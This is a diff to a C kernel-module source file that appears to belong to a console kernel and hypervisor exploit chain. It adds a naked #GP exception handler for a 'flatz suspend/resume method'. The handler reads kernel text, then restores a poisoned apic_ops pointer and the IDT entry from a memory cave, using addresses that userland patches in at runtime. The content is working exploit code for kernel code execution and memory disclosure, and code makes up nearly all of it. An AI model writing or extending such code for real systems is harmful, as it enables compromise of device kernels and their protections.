@@ -129,6 +129,8 @@ struct kmod_result_buf {
     /* Phase 7: trampoline addresses for apic_ops hook */
     volatile uint64_t trampoline_func_kva;    /* KVA of trampoline_xapic_mode() */
     volatile uint64_t trampoline_target_kva;  /* KVA of g_trampoline_target */
+    /* Phase 9: #GP handler for flatz method */
+    volatile uint64_t gp_handler_kva;         /* KVA of gp_handler() */
 };
 
 /* ============================================================
@@ -150,11 +152,12 @@ volatile uint64_t g_output_kva = OUTPUT_KVA_SENTINEL;
 /* Local result buffer - filled by campaigns, then copied out */
 struct kmod_result_buf hv_results = { .magic = 0x1 };
 
-/* Phase 7: Forward declarations (definitions at end of file,
+/* Phase 7/9: Forward declarations (definitions at end of file,
  * AFTER hv_idt_trampoline, so the IDT trampoline remains at
  * offset 0 in .text — the kmod scanner depends on this!) */
 extern volatile uint64_t g_trampoline_target;
 int trampoline_xapic_mode(void);
+void gp_handler(void);
 
 /* ============================================================
  * Inline assembly helpers - ring 0 hardware access
@@ -413,6 +416,9 @@ static void hv_init(const void *arg __attribute__((unused))) {
     hv_results.trampoline_func_kva = (uint64_t)&trampoline_xapic_mode;
     hv_results.trampoline_target_kva = (uint64_t)&g_trampoline_target;
 
+    /* Record #GP handler address for Phase 9 */
+    hv_results.gp_handler_kva = (uint64_t)&gp_handler;
+
     /* Mark completion */
     memory_barrier();
     hv_results.status = KMOD_STATUS_DONE;
@@ -550,6 +556,61 @@ void hv_idt_trampoline(void) {
         "pop %%rcx\n"
         "pop %%rax\n"
         /* Return from interrupt → back to ring 3 userland */
+        "iretq\n"
+        ::: "memory"
+    );
+}
+
+/* ============================================================
+ * Phase 9: #GP handler for flatz suspend/resume method
+ *
+ * This naked function runs when #GP fires during resume after
+ * apic_ops[2] has been poisoned with a non-canonical address.
+ * It runs on the IST3 stack (set to a cave in kdata).
+ *
+ * The handler:
+ *   1. Reads 8 bytes from ktext (proof of readability)
+ *   2. Restores original IDT[13] from backup in cave
+ *   3. Restores original apic_ops[2] value
+ *   4. Returns via iretq to re-execute the faulting call
+ *
+ * The 6 movabs immediates are patched at runtime by userland
+ * via DMAP before the pointer is poisoned.  Each has a unique
+ * magic value (0xDEAD000000000001-6) that userland locates
+ * and replaces with the actual runtime address/value.
+ * ============================================================ */
+
+__attribute__((naked, used, aligned(16)))
+void gp_handler(void) {
+    __asm__ volatile(
+        "push %%rax\n"
+        "push %%rcx\n"
+        "push %%rsi\n"
+        "push %%rdi\n"
+        "cld\n"
+
+        /* 1. Read 8 bytes from ktext → proof in cave */
+        "movabs $0xDEAD000000000001, %%rsi\n"   /* ktext VA to read */
+        "mov (%%rsi), %%rax\n"
+        "movabs $0xDEAD000000000002, %%rdi\n"   /* cave proof slot (DMAP) */
+        "mov %%rax, (%%rdi)\n"
+
+        /* 2. Restore IDT[13]: 16 bytes from cave backup → IDT */
+        "movabs $0xDEAD000000000003, %%rsi\n"   /* cave IDT backup (DMAP) */
+        "movabs $0xDEAD000000000004, %%rdi\n"   /* IDT[13] location (DMAP) */
+        "mov $16, %%ecx\n"
+        "rep movsb\n"
+
+        /* 3. Restore apic_ops[2] */
+        "movabs $0xDEAD000000000005, %%rax\n"   /* original xapic_mode VALUE */
+        "movabs $0xDEAD000000000006, %%rdi\n"   /* apic_ops[2] (DMAP) */
+        "mov %%rax, (%%rdi)\n"
+
+        "pop %%rdi\n"
+        "pop %%rsi\n"
+        "pop %%rcx\n"
+        "pop %%rax\n"
+        "add $8, %%rsp\n"       /* skip error code */
         "iretq\n"
         ::: "memory"
     );
